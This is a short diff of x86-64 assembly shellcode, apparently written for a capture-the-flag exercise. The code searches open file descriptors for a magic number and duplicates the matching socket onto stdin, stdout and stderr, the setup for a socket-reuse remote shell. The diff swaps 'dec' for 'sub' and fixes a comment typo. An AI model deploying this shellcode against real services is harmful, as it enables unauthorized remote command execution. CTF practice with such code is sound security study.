@@ -21,11 +21,11 @@ main:
 	xor edx, edx
 	lea edi, [rdx+20]	;adjust for the popularity of the ctf	
 	
-	;; rdi is the starting fd to read from, we try each in decending order
+	;; rdi is the starting fd to read from, we try each in descending order
 	mov dl, 4 ;read 4 bytes	
 	mov ebx, MAGIC	
 ourread:
-	dec edi 	
+	sub edi, 1 	
 %ifdef DEBUG
 	jnz ourread.next	
 	int 3; this breakpoint triggers if we DON'T find the magic number
@@ -49,7 +49,7 @@ mydup2:
 copy_stdin_out_err:
         mov al, dup2
         syscall
-        dec esi
+        sub esi,1 
         jns copy_stdin_out_err	
 
 
